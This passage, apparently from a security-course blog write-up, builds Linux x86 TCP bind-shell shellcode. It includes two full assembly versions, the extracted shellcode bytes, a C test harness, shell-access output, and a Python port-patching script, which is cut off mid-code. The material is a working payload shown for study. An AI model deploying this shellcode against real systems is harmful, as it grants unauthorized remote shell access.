<span class="nf">push</span> <span class="nb">edi</span>            <span class="c1">; int sockfd -&gt; saved sock fd value</span>
<span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>
<span class="nf">int</span> <span class="mh">0x80</span>            <span class="c1">; sys_socketcall (SYS_ACCEPT)</span>
</code></pre></div></div>

<p>To redirect IO to the descriptor, a loop with the <code class="language-plaintext highlighter-rouge">$ecx</code> register is used. Because of the way the loop instruction works (it exits when <code class="language-plaintext highlighter-rouge">$ecx</code> is 0), the <code class="language-plaintext highlighter-rouge">dec</code> and <code class="language-plaintext highlighter-rouge">inc</code> instruction are used here so we can still use the <code class="language-plaintext highlighter-rouge">$ecx</code> value to call <code class="language-plaintext highlighter-rouge">dup2</code>.</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">; Redirect STDIN, STDOUT, STDERR to socket</span>
<span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>
<span class="nf">mov</span> <span class="nb">cl</span><span class="p">,</span> <span class="mh">0x3</span>         <span class="c1">; counter for loop (stdin to stderr)</span>
<span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">edi</span>        <span class="c1">; socket fd</span>

<span class="nl">dup2:</span>
<span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0x3f</span>        <span class="c1">; sys_dup2</span>
<span class="nf">dec</span> <span class="nb">ecx</span>
<span class="nf">int</span> <span class="mh">0x80</span>            <span class="c1">; sys_dup2</span>
<span class="nf">inc</span> <span class="nb">ecx</span>
<span class="nf">loop</span> <span class="nv">dup2</span>
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">/bin/bash</code> program is used to spawn a shell, padding it with forward slashes so it is 4 bytes aligned. Because the string needs to be null-terminated, an garbage character (<code class="language-plaintext highlighter-rouge">A</code>) is added to string and is changed to a NULL with the subsequent <code class="language-plaintext highlighter-rouge">mov byte [esp + 11], al</code> instruction.</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">; execve()</span>
<span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
<span class="nf">push</span> <span class="mh">0x41687361</span>     <span class="c1">; ///bin/bashA</span>
<span class="nf">push</span> <span class="mh">0x622f6e69</span>
<span class="nf">push</span> <span class="mh">0x622f2f2f</span>
<span class="nf">mov</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">esp</span> <span class="o">+</span> <span class="mi">11</span><span class="p">],</span> <span class="nb">al</span> <span class="c1">; NULL terminate string</span>
<span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0xb</span>         <span class="c1">; sys_execve</span>
<span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>        <span class="c1">; const char *filename</span>
<span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>        <span class="c1">; char *const argv[]</span>
<span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">edx</span>        <span class="c1">; char *const envp[]</span>
<span class="nf">int</span> <span class="mh">0x80</span>            <span class="c1">; sys_execve</span>
</code></pre></div></div>

<p>The final assembly code looks like this:</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">global</span> <span class="nv">_start</span>

<span class="nf">section</span> <span class="nv">.text</span>

<span class="nl">_start:</span>

    <span class="c1">; Zero registers</span>
    <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
    <span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">ebx</span>
    <span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>
    <span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">edx</span>

    <span class="c1">; Create socket</span>
    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0x66</span>        <span class="c1">; sys_socketcall</span>
    <span class="nf">mov</span> <span class="nb">bl</span><span class="p">,</span> <span class="mh">0x1</span>         <span class="c1">;   SYS_SOCKET</span>
    <span class="nf">push</span> <span class="mh">0x6</span>            <span class="c1">; int protocol -&gt; IPPROTO_TCP</span>
    <span class="nf">push</span> <span class="mh">0x1</span>            <span class="c1">; int type -&gt; SOCK_STREAM</span>
    <span class="nf">push</span> <span class="mh">0x2</span>            <span class="c1">; int domain -&gt; AF_INET</span>
    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>
    <span class="nf">int</span> <span class="mh">0x80</span>            <span class="c1">; sys_socketcall (SYS_SOCKET)</span>
    <span class="nf">mov</span> <span class="nb">edi</span><span class="p">,</span> <span class="nb">eax</span>        <span class="c1">; save socket fd</span>

    <span class="c1">; Create addr struct</span>
    <span class="nf">push</span> <span class="nb">edx</span>            <span class="c1">; NULL padding</span>
    <span class="nf">push</span> <span class="nb">edx</span>            <span class="c1">; NULL padding</span>
    <span class="nf">push</span> <span class="nb">edx</span>            <span class="c1">; sin.addr (0.0.0.0)</span>
    <span class="nf">push</span> <span class="kt">word</span> <span class="mh">0x5c11</span>    <span class="c1">; Port</span>
    <span class="nf">push</span> <span class="kt">word</span> <span class="mh">0x2</span>       <span class="c1">; AF_INET</span>
    <span class="nf">mov</span> <span class="nb">esi</span><span class="p">,</span> <span class="nb">esp</span>

    <span class="c1">; Bind socket</span>
    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0x66</span>        <span class="c1">; sys_socketcall</span>
    <span class="nf">mov</span> <span class="nb">bl</span><span class="p">,</span> <span class="mh">0x2</span>         <span class="c1">;   SYS_BIND</span>
    <span class="nf">push</span> <span class="mh">0x10</span>           <span class="c1">; socklen_t addrlen</span>
    <span class="nf">push</span> <span class="nb">esi</span>            <span class="c1">; const struct sockaddr *addr</span>
    <span class="nf">push</span> <span class="nb">edi</span>            <span class="c1">; int sockfd -&gt; saved socket fd</span>
    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>
    <span class="nf">int</span> <span class="mh">0x80</span>            <span class="c1">; sys_socketcall (SYS_BIND)</span>

    <span class="c1">; Listen for connection</span>
    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0x66</span>        <span class="c1">; sys_socketcall</span>
    <span class="nf">mov</span> <span class="nb">bl</span><span class="p">,</span> <span class="mh">0x4</span>         <span class="c1">;   SYS_LISTEN</span>
    <span class="nf">push</span> <span class="nb">edx</span>            <span class="c1">; int backlog -&gt; NULL</span>
    <span class="nf">push</span> <span class="nb">edi</span>            <span class="c1">; int sockfd -&gt; saved socket fd</span>
    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>
    <span class="nf">int</span> <span class="mh">0x80</span>            <span class="c1">; sys_socketcall (SYS_LISTEN)</span>

    <span class="c1">; Accept connection</span>
    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0x66</span>        <span class="c1">; sys_socketcall</span>
    <span class="nf">mov</span> <span class="nb">bl</span><span class="p">,</span> <span class="mh">0x5</span>         <span class="c1">;   SYS_ACCEPT</span>
    <span class="nf">push</span> <span class="nb">edx</span>            <span class="c1">; socklen_t *addrlen -&gt; NULL</span>
    <span class="nf">push</span> <span class="nb">edx</span>            <span class="c1">; struct sockaddr *addr -&gt; NULL</span>
    <span class="nf">push</span> <span class="nb">edi</span>            <span class="c1">; int sockfd -&gt; saved sock fd value</span>
    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>
    <span class="nf">int</span> <span class="mh">0x80</span>            <span class="c1">; sys_socketcall (SYS_ACCEPT)</span>
    <span class="nf">mov</span> <span class="nb">edi</span><span class="p">,</span> <span class="nb">eax</span>

    <span class="c1">; Redirect STDIN, STDOUT, STDERR to socket</span>
    <span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>
    <span class="nf">mov</span> <span class="nb">cl</span><span class="p">,</span> <span class="mh">0x3</span>         <span class="c1">; counter for loop (stdin to stderr)</span>
    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">edi</span>        <span class="c1">; socket fd</span>

    <span class="nl">dup2:</span>
    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0x3f</span>        <span class="c1">; sys_dup2</span>
    <span class="nf">dec</span> <span class="nb">ecx</span>
    <span class="nf">int</span> <span class="mh">0x80</span>            <span class="c1">; sys_dup2</span>
    <span class="nf">inc</span> <span class="nb">ecx</span>
    <span class="nf">loop</span> <span class="nv">dup2</span>

    <span class="c1">; execve()</span>
    <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
    <span class="nf">push</span> <span class="mh">0x41687361</span>     <span class="c1">; ///bin/bashA</span>
    <span class="nf">push</span> <span class="mh">0x622f6e69</span>
    <span class="nf">push</span> <span class="mh">0x622f2f2f</span>
    <span class="nf">mov</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">esp</span> <span class="o">+</span> <span class="mi">11</span><span class="p">],</span> <span class="nb">al</span> <span class="c1">; NULL terminate string</span>
    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0xb</span>         <span class="c1">; sys_execve</span>
    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>        <span class="c1">; const char *filename</span>
    <span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>        <span class="c1">; char *const argv[]</span>
    <span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">edx</span>        <span class="c1">; char *const envp[]</span>
    <span class="nf">int</span> <span class="mh">0x80</span>            <span class="c1">; sys_execve</span>
</code></pre></div></div>

<p>Compiling and linking the code…</p>
<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">slemire@slae:~/slae32/assignment1$</span><span class="w"> </span>../compile.sh shell_bind_tcp
<span class="go">[+] Assembling with Nasm ... 
[+] Linking ...
[+] Shellcode: \x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x52\x52\x52\x66\x68\x11\x5c\x66\x6a\x02\x89\xe6\xb0\x66\xb3\x02\x6a\x10\x56\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x52\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x57\x89\xe1\xcd\x80\x89\xc7\x31\xc9\xb1\x03\x89\xfb\xb0\x3f\x49\xcd\x80\x41\xe2\xf8\x31\xc0\x68\x61\x73\x68\x41\x68\x69\x6e\x2f\x62\x68\x2f\x2f\x2f\x62\x88\x44\x24\x0b\xb0\x0b\x89\xe3\x31\xc9\x31\xd2\xcd\x80
[+] Length: 116
[+] Done!
</span></code></pre></div></div>

<p>Testing the ELF binary generated by NASM:</p>
<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">slemire@slae:~/slae32/assignment1$</span><span class="w"> </span>file shell_bind_tcp
<span class="go">shell_bind_tcp: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped
[...]
</span><span class="gp">slemire@slae:~/slae32/assignment1$</span><span class="w"> </span>./shell_bind_tcp
<span class="go">[...]
</span><span class="gp">slemire@slae:~$</span><span class="w"> </span>nc <span class="nt">-nv</span> 127.0.0.1 4444
<span class="go">Connection to 127.0.0.1 4444 port [tcp/*] succeeded!
id
uid=1000(slemire) gid=1000(slemire) groups=1000(slemire),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
</span></code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">shellcode.c</code> program is then used to test the shellcode as it would used in an actual exploit:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
</span>
<span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span><span class="o">=</span><span class="s">"</span><span class="se">\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x52\x52\x52\x66\x68\x11\x5c\x66\x6a\x02\x89\xe6\xb0\x66\xb3\x02\x6a\x10\x56\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x52\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x57\x89\xe1\xcd\x80\x89\xc7\x31\xc9\xb1\x03\x89\xfb\xb0\x3f\x49\xcd\x80\x41\xe2\xf8\x31\xc0\x68\x61\x73\x68\x41\x68\x69\x6e\x2f\x62\x68\x2f\x2f\x2f\x62\x88\x44\x24\x0b\xb0\x0b\x89\xe3\x31\xc9\x31\xd2\xcd\x80</span><span class="s">"</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ret</span><span class="p">)()</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">shellcode</span><span class="p">;</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Size: %d bytes.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
    <span class="n">ret</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The test program is compiled and tested:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>slemire@slae:~/slae32/assignment1$ gcc -o shellcode -fno-stack-protector -z execstack shellcode.c    
slemire@slae:~/slae32/assignment1$ ./shellcode
[...]
slemire@slae:~$ nc -nv 127.0.0.1 4444
Connection to 127.0.0.1 4444 port [tcp/*] succeeded!
whoami
slemire
</code></pre></div></div>

<h3 id="2nd-version-using-syscalls">2nd version using syscalls</h3>
<hr />
<p>The 2nd version of this bind shellcode uses the new syscalls. According to the following <a href="https://patchwork.kernel.org/patch/146431/">kernel patch</a>, sometimes in 2010 they added new syscall entries for non-multiplexed socket calls.</p>

<p>The ones that interest us are:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define __NR_socket 359
#define __NR_bind 361
#define __NR_connect 362
#define __NR_listen 363
#define __NR_accept4 364
</span></code></pre></div></div>

<p>Instead of using <code class="language-plaintext highlighter-rouge">sys_socketcall</code>, we can use those syscalls directly and put the arguments in the registers. The same code flow is used but the arguments are passed differently.</p>

<p>The second version of the shellcode looks like this:</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">global</span> <span class="nv">_start</span>

<span class="nf">section</span> <span class="nv">.text</span>

<span class="nl">_start:</span>

    <span class="c1">; Zero registers</span>
    <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
    <span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">ebx</span>
    <span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>
    <span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">edx</span>

    <span class="c1">; Create socket</span>
    <span class="nf">mov</span> <span class="nb">ax</span><span class="p">,</span> <span class="mh">0x167</span>       <span class="c1">; sys_socket</span>
    <span class="nf">mov</span> <span class="nb">bl</span><span class="p">,</span> <span class="mh">0x2</span>         <span class="c1">; int domain -&gt; AF_INET</span>
    <span class="nf">inc</span> <span class="nb">ecx</span>             <span class="c1">; int type -&gt; SOCK_STREAM</span>
    <span class="nf">mov</span> <span class="nb">dl</span><span class="p">,</span> <span class="mh">0x6</span>         <span class="c1">; int protocol -&gt; IPPROTO_TCP</span>
    <span class="nf">int</span> <span class="mh">0x80</span>            <span class="c1">; sys_socket</span>
    <span class="nf">mov</span> <span class="nb">edi</span><span class="p">,</span> <span class="nb">eax</span>        <span class="c1">; save socket fd</span>

    <span class="c1">; Create addr struct</span>
    <span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">edx</span>
    <span class="nf">push</span> <span class="nb">edx</span>            <span class="c1">; NULL padding</span>
    <span class="nf">push</span> <span class="nb">edx</span>            <span class="c1">; NULL padding</span>
    <span class="nf">push</span> <span class="nb">edx</span>            <span class="c1">; sin.addr (0.0.0.0)</span>
    <span class="nf">push</span> <span class="kt">word</span> <span class="mh">0x5c11</span>    <span class="c1">; Port</span>
    <span class="nf">push</span> <span class="kt">word</span> <span class="mh">0x2</span>       <span class="c1">; AF_INET</span>
    <span class="nf">mov</span> <span class="nb">esi</span><span class="p">,</span> <span class="nb">esp</span>

    <span class="c1">; Bind socket</span>
    <span class="nf">mov</span> <span class="nb">ax</span><span class="p">,</span> <span class="mh">0x169</span>       <span class="c1">; sys_bind</span>
    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">edi</span>        <span class="c1">; int sockfd -&gt; saved socket fd</span>
    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esi</span>        <span class="c1">; const struct sockaddr *addr</span>
    <span class="nf">mov</span> <span class="nb">dl</span><span class="p">,</span> <span class="mh">0x10</span>        <span class="c1">; socklen_t addrlen</span>
    <span class="nf">int</span> <span class="mh">0x80</span>            <span class="c1">; sys_bind</span>

    <span class="c1">; Listen for connection</span>
    <span class="nf">mov</span> <span class="nb">ax</span><span class="p">,</span> <span class="mh">0x16b</span>       <span class="c1">; sys_listen</span>
    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">edi</span>        <span class="c1">; int sockfd -&gt; saved socket fd</span>
    <span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>        <span class="c1">; int backlog -&gt; NULL</span>
    <span class="nf">int</span> <span class="mh">0x80</span>            <span class="c1">; sys_socketcall (SYS_LISTEN)</span>

    <span class="c1">; Accept connection</span>
    <span class="nf">mov</span> <span class="nb">ax</span><span class="p">,</span> <span class="mh">0x16c</span>       <span class="c1">; sys_accept4</span>
    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">edi</span>        <span class="c1">; int sockfd -&gt; saved sock fd value</span>
    <span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>        <span class="c1">; struct sockaddr *addr -&gt; NULL</span>
    <span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">edx</span>        <span class="c1">; socklen_t *addrlen -&gt; NULL</span>
    <span class="nf">xor</span> <span class="nb">esi</span><span class="p">,</span> <span class="nb">esi</span>
    <span class="nf">int</span> <span class="mh">0x80</span>            <span class="c1">; sys_socketcall (SYS_ACCEPT)</span>
    <span class="nf">mov</span> <span class="nb">edi</span><span class="p">,</span> <span class="nb">eax</span>        <span class="c1">; save the new fd</span>

    <span class="c1">; Redirect STDIN, STDOUT, STDERR to socket</span>
    <span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>
    <span class="nf">mov</span> <span class="nb">cl</span><span class="p">,</span> <span class="mh">0x3</span>         <span class="c1">; counter for loop (stdin to stderr)</span>
    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">edi</span>        <span class="c1">; socket fd</span>

    <span class="nl">dup2:</span>
    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0x3f</span>        <span class="c1">; sys_dup2</span>
    <span class="nf">dec</span> <span class="nb">ecx</span>
    <span class="nf">int</span> <span class="mh">0x80</span>            <span class="c1">; sys_dup2</span>
    <span class="nf">inc</span> <span class="nb">ecx</span>
    <span class="nf">loop</span> <span class="nv">dup2</span>

    <span class="c1">; execve()</span>
    <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
    <span class="nf">push</span> <span class="mh">0x41687361</span>     <span class="c1">; ///bin/bashA</span>
    <span class="nf">push</span> <span class="mh">0x622f6e69</span>
    <span class="nf">push</span> <span class="mh">0x622f2f2f</span>
    <span class="nf">mov</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">esp</span> <span class="o">+</span> <span class="mi">11</span><span class="p">],</span> <span class="nb">al</span> <span class="c1">; NULL terminate string</span>
    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0xb</span>         <span class="c1">; sys_execve</span>
    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>        <span class="c1">; const char *filename</span>
    <span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>        <span class="c1">; char *const argv[]</span>
    <span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">edx</span>        <span class="c1">; char *const envp[]</span>
    <span class="nf">int</span> <span class="mh">0x80</span>            <span class="c1">; sys_execve</span>
</code></pre></div></div>

<p>If we want to change the listening port, we can modify the assembly code and re-compile it but instead it would be more convenient to use a small python script that will automatically replace the port in the shellcode.</p>

<p>The following script replaces the hardcoded port <code class="language-plaintext highlighter-rouge">4444</code> from the shellcode with the port supplied at the command line. The script also gives a warning if any null bytes are contained in the modified shellcode. Depending on which port is being used, it’s possible some values may generate null bytes.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
</span>
<span class="kn">import</span> <span class="nn">socket</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="n">shellcode</span> <span class="o">=</span>  <span class="s">'</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xc0</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xdb</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xc9</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xd2</span><span class="se">\\</span><span class="s">xb0</span><span class="se">\\</span><span class="s">x66</span><span class="se">\\</span><span class="s">xb3</span><span class="se">\\</span><span class="s">x01</span><span class="se">\\</span><span class="s">x6a</span><span class="se">\\</span><span class="s">x06</span><span class="se">\\</span><span class="s">x6a</span><span class="se">\\</span><span class="s">x01'</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="s">'</span><span class="se">\\</span><span class="s">x6a</span><span class="se">\\</span><span class="s">x02</span><span class="se">\\</span><span class="s">x89</span><span class="se">\\</span><span class="s">xe1</span><span class="se">\\</span><span class="s">xcd</span><span class="se">\\</span><span class="s">x80</span><span class="se">\\</span><span class="s">x89</span><span class="se">\\</span><span class="s">xc7</span><span class="se">\\</span><span class="s">x52</span><span class="se">\\</span><span class="s">x52</span><span class="se">\\</span><span class="s">x52</span><span class="se">\\</span><span class="s">x66</span><span class="se">\\</span><span class="s">x68</span><span class="se">\\</span><span class="s">x11</span><span class="se">\\</span><span class="s">x5c</span><span class="se">\\</span><span class="s">x66'</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="s">'</span><span class="se">\\</span><span class="s">x6a</span><span class="se">\\</span><span class="s">x02</span><span class="se">\\</span><span class="s">x89</span><span class="se">\\</span><span class="s">xe6</span><span class="se">\\</span><span class="s">xb0</span><span class="se">\\</span><span class="s">x66</span><span class="se">\\</span><span class="s">xb3</span><span class="se">\\</span><span class="s">x02</span><span class="se">\\</span><span class="s">x6a</span><span class="se">\\</span><span class="s">x10</span><span class="se">\\</span><span class="s">x56</span><span class="se">\\</span><span class="s">x57</span><span class="se">\\</span><span class="s">x89</span><span class="se">\\</span><span class="s">xe1</span><span class="se">\\</span><span class="s">xcd</span><span class="se">\\</span><span class="s">x80'</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="s">'</span><span class="se">\\</span><span class="s">xb0</span><span class="se">\\</span><span class="s">x66</span><span class="se">\\</span><span class="s">xb3</span><span class="se">\\</span><span class="s">x04</span><span class="se">\\</span><span class="s">x52</span><span class="se">\\</span><span class="s">x57</span><span class="se">\\</span><span class="s">x89</span><span class="se">\\</span><span class="s">xe1</span><span class="se">\\</span><span class="s">xcd</span><span class="se">\\</span><span class="s">x80</span><span class="se">\\</span><span class="s">xb0</span><span class="se">\\</span><span class="s">x66</span><span class="se">\\</span><span class="s">xb3</span><span class="se">\\</span><span class="s">x05</span><span class="se">\\</span><span class="s">x52</span><span class="se">\\</span><span class="s">x52'</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="s">'</span><span class="se">\\</span><span class="s">x57</span><span class="se">\\</span><span class="s">x89</span><span class="se">\\</span><span class="s">xe1</span><span class="se">\\</span><span class="s">xcd</span><span class="se">\\</span><span class="s">x80</span><span class="se">\\</span><span class="s">x89</span><span class="se">\\</span><span class="s">xc7</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xc9</span><span class="se">\\</span><span class="s">xb1</span><span class="se">\\</span><span class="s">x03</span><span class="se">\\</span><span class="s">x89</span><span class="se">\\</span><span class="s">xfb</span><span class="se">\\</span><span class="s">xb0</span><span class="se">\\</span><span class="s">x3f</span><span class="se">\\</span><span class="s">x49'</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="s">'</span><span class="se">\\</span><span class="s">xcd</span><span class="se">\\</span><span class="s">x80</span><span class="se">\\</span><span class="s">x41</span><span class="se">\\</span><span class="s">xe2</span><span class="se">\\</span><span class="s">xf8</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xc0</span><span class="se">\\</span><span class="s">x68</span><span class="se">\\</span><span class="s">x61</span><span class="se">\\</span><span class="s">x73</span><span class="se">\\</span><span class="s">x68</span><span class="se">\\</span><span class="s">x41</span><span class="se">\\</span><span class="s">x68</span><span class="se">\\</span><span class="s">x69</span><span class="se">\\</span><span class="s">x6e</span><span class="se">\\</span><span class="s">x2f'</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="s">'</span><span class="se">\\</span><span class="s">x62</span><span class="se">\\</span><span class="s">x68</span><span class="se">\\</span><span class="s">x2f</span><span class="se">\\</span><span class="s">x2f</span><span class="se">\\</span><span class="s">x2f</span><span class="se">\\</span><span class="s">x62</span><span class="se">\\</span><span class="s">x88</span><span class="se">\\</span><span class="s">x44</span><span class="se">\\</span><span class="s">x24</span><span class="se">\\</span><span class="s">x0b</span><span class="se">\\</span><span class="s">xb0</span><span class="se">\\</span><span class="s">x0b</span><span class="se">\\</span><span class="s">x89</span><span class="se">\\</span><span class="s">xe3</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xc9'</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="s">'</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xd2</span><span class="se">\\</span><span class="s">xcd</span><span class="se">\\</span><span class="s">x80'</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">'Usage: {name} [port]'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">name</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
    <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">port</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">port_htons</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">htons</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">port</span><span class="p">)))</span>

<span class="n">byte1</span> <span class="o">=</span> <span class="n">port_htons</span><span class="p">[</span><span class="mi">4</span><span class="p">:]</span>
<span class="k">if</span> <span class="n">byte1</span> <span class="o">==</span> <span class="s">''</span><span class="p">:</span>
    <span class="n">byte1</span> <span class="o">=</span> <span class="s">'0'</span>
<span class="n">byte2</span> <span class="o">=</span> <span class="n">port_htons</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mi">4</span><span class="p">]</span>
<span class="n">shellcode</span> <span class="o">=</span> <span class="n">shellcode</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'</span><span class="se">\\</span><span class="s">x11</span><span class="se">\\</span><span class="s">x5c'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\</span><span class="s">x{}</span><span class="se">\\</span><span class="s">x{}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">byte1</span><span class="p">,</span> <span class="n">byte2</span><span class="p">))</span>

<span class="k">print</span><span class="p">(</span><span class="s">'Here</span><span class="se">\'</span><span class="s">s the shellcode using port {port}:'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">port</span> <span class="o">=</span> <span class="n">port</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>

<span class="k">if</span> <span class="s">'</span><span class="se">\\</span><span class="s">x0</span><span class="se">\\</span><span class="s">'</span> <span class="ow">in</span> <span class="n">shellcode</span> <span class="ow">or</span> <span class="s">'</span><span class="se">\\</span><span class="s">x00</span><span class="se">\\</span><span class="s">'</span> <span class="ow">in</span> <span class="n">shellcode</span><span class="p">:</span>
